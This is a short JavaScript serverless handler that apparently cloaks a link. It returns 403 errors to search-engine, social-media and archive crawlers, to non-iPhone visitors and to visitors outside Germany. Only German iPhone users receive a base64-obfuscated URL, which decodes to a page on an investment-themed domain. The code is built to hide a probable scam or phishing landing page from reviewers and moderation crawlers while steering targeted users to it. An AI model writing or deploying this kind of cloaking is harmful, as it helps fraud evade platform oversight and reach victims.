export default async function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';
  const acceptLang = req.headers['accept-language'] || '';
  const country = req.headers['x-vercel-ip-country'] || '';
  
  const isBot = /(google|bot|crawler|spider|facebook|preview|archive|bing)/i.test(userAgent);
  const isIphone = /iPhone/i.test(userAgent);

  if (isBot) {
    return res.status(403).json({ status: 'bot' });
  }

  if (!isIphone) {
    return res.status(403).json({ status: 'not_iphone' });
  }

  if (country !== 'DE') {
    return res.status(403).json({ status: 'not_de' });
  }

  // Зашифрованная ссылка
  const encodedUrl = 'aHR0cHM6Ly93ZWFsdGgtbWFzdGVycHJvLmNvbS9kZS8=';
  const decodedUrl = Buffer.from(encodedUrl, 'base64').toString('utf-8');

  return res.status(200).json({
    status: 'ok',
    url: decodedUrl
  });
}
